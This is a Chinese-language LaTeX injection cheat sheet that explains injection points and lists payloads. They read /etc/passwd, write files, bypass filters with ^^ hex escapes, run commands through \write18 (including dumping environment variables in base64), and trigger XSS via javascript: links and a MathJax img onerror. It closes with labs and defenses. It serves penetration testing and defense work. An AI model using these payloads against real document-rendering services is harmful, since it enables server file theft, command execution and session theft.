# LaTeX 注入

> LaTeX 注入是一种注入攻击，攻击者将恶意内容注入到 LaTeX 文档中。LaTeX 广泛用于文档准备和排版，特别是在学术界，用于生成高质量的科技和数学文档。由于其强大的脚本功能，如果未采取适当的安全措施，攻击者可能利用 LaTeX 执行任意命令。

## LaTeX 注入原理

### 基本概念

LaTeX 是一种基于 TeX 的排版系统，它不仅仅是一个标记语言，而是一个图灵完备的编程语言。这种强大的功能使得 LaTeX 能够执行复杂的文档处理任务，但同时也带来了安全风险。

### 注入点

1. **用户输入处理**
   - 在线 LaTeX 编辑器
   - 学术论文提交系统
   - 简历/CV 生成器
   - 数学公式编辑器
   - 报告生成工具

2. **常见漏洞位置**
   - 文档内容区域
   - 数学公式输入框
   - 图表标题和标签
   - 参考文献和引用
   - 自定义宏定义

### 攻击原理

1. **命令执行机制**
   - `\write18` 原语：允许执行系统命令
   - `\input` 和 `\include`：读取任意文件
   - `\catcode`：修改字符类别码，绕过过滤

2. **上下文逃逸**
   - 从受限制的数学模式逃逸到文本模式
   - 从文本模式逃逸到原始 TeX 模式
   - 利用特殊字符和转义序列

3. **二次渲染攻击**
   - 注入的 LaTeX 代码在 PDF 查看器中二次渲染
   - 利用 PDF 交互元素执行 JavaScript
   - 通过超链接触发 XSS

### 攻击面

1. **服务器端攻击**
   - 读取敏感文件 (`/etc/passwd`, `.env` 等)
   - 执行任意系统命令
   - 进行端口扫描和网络探测
   - 建立反向 shell

2. **客户端攻击**
   - 跨站脚本 (XSS)
   - 点击劫持 (Clickjacking)
   - 敏感信息泄露
   - 钓鱼攻击

### 技术细节

1. **命令执行**
   ```tex
   \immediate\write18{id > /tmp/output}
   \input{/tmp/output}
   ```

2. **文件读取**
   ```tex
   \newread\file
   \openin\file=/etc/passwd
   \read\file to\line
   \text{\line}
   \closein\file
   ```

3. **字符转义绕过**
   ```tex
   \catcode`\$=12  % 禁用 $ 的特殊含义
   \catcode`\#=12  % 禁用 # 的特殊含义
   \input{sensitive_file}
   ```

### 防御挑战

1. **过滤困难**
   - LaTeX 语法复杂，难以完全过滤
   - 多种方式表示相同命令
   - 字符编码和转义序列的多样性

2. **上下文感知**
   - 需要理解 LaTeX 的解析上下文
   - 数学模式与文本模式的不同规则
   - 宏定义和扩展的复杂性

3. **沙箱逃逸**
   - 不完整的沙箱实现
   - 共享资源访问
   - 文件系统交互

### 实际案例

1. **学术论文系统**
   - 攻击者通过提交包含恶意 LaTeX 代码的论文
   - 获取服务器敏感信息
   - 入侵学术数据库

2. **在线简历生成器**
   - 通过简历中的 LaTeX 注入
   - 窃取其他用户的简历信息
   - 进行横向移动

3. **数学公式编辑器**
   - 在数学公式中注入恶意代码
   - 影响查看该公式的所有用户
   - 窃取会话令牌

了解这些原理对于有效防御 LaTeX 注入攻击至关重要。在实现 LaTeX 处理功能时，必须考虑这些安全风险并采取适当的防护措施。

## 目录

* [文件操作](#文件操作)
    * [读取文件](#读取文件)
    * [写入文件](#写入文件)
* [命令执行](#命令执行)
* [跨站脚本攻击](#跨站脚本攻击)
* [实验](#实验)
* [参考资料](#参考资料)

## 文件操作

### 读取文件

攻击者可以读取服务器上的敏感文件内容。

读取文件并解释其中的 LaTeX 代码：

```tex
\input{/etc/passwd}
\include{somefile} # 加载 .tex 文件 (somefile.tex)
```

读取单行文件：

```tex
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```

读取多行文件：

```tex
\lstinputlisting{/etc/passwd}
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```

读取文本文件，**不解释**内容，仅粘贴原始文件内容：

```tex
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```

如果注入点在文档头之后（无法使用 `\usepackage`），可以停用某些控制字符，以便在包含 `$`、`#`、`_`、`&`、空字节等字符的文件上使用 `\input`（例如 Perl 脚本）。

```tex
\catcode `\$=12
\catcode `\#=12
\catcode `\_=12
\catcode `\&=12
\input{path_to_script.pl}
```

要绕过黑名单，可以尝试用其 Unicode 十六进制值替换一个字符。

* ^^41 表示大写字母 A
* ^^7e 表示波浪号 (~)，注意 'e' 必须小写

```tex
\lstin^^70utlisting{/etc/passwd}
```

### 写入文件

写入单行文件：

```tex
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\write\outfile{Line 2}
\write\outfile{I like trains}
\closeout\outfile
```

## 命令执行

命令的输出将被重定向到标准输出，因此需要使用临时文件来获取结果。

```tex
\immediate\write18{id > output}
\input{output}
```

如果出现任何 LaTeX 错误，考虑使用 base64 来获取结果（或使用 `\verbatiminput`）：

```tex
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```tex
\input|ls|base64
\input{|"/bin/hostname"}
```

## 跨站脚本攻击

来自 [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)

```tex
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```

在 [mathjax](https://docs.mathjax.org/en/latest/input/tex/extensions/unicode.html) 中：

```tex
\unicode{<img src=1 onerror="<ARBITRARY_JS_CODE>">}
```

## 实验

* [Root Me - LaTeX - 输入](https://www.root-me.org/en/Challenges/App-Script/LaTeX-Input)
* [Root Me - LaTeX - 命令执行](https://www.root-me.org/en/Challenges/App-Script/LaTeX-Command-execution)

## 参考资料

* [使用 LaTeX 进行黑客攻击 - Sebastian Neef - 2016年3月10日](https://0day.work/hacking-with-latex/)
* [从 LaTeX 到 RCE，私有漏洞赏金计划 - Yasho - 2018年7月6日](https://medium.com/bugbountywriteup/latex-to-rce-private-bug-bounty-program-6a0b5b33d26a)
* [感谢 LaTeX 入侵同事 - scumjr - 2016年11月28日](http://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)
* [LaTeX 注入 - HackTricks](https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection)
* [LaTeX 注入速查表 - OWASP](https://cheatsheetseries.owasp.org/cheatsheets/LaTeX_Injection_Cheat_Sheet.html)

## 防御措施

1. **输入验证**
   - 对所有用户输入进行严格验证
   - 使用白名单限制允许的 LaTeX 命令

2. **沙箱环境**
   - 在受限环境中处理 LaTeX 文档
   - 使用专用用户运行 LaTeX 编译器，限制其权限

3. **禁用危险命令**
   - 禁用 `\write18` 和其他危险命令
   - 使用 `--no-shell-escape` 参数运行 LaTeX 编译器

4. **输出清理**
   - 清理生成的 PDF 文件中的恶意内容
   - 将 PDF 转换为图像或使用其他安全查看器

5. **安全配置**
   - 保持 LaTeX 发行版和依赖项更新
   - 使用最新的安全补丁
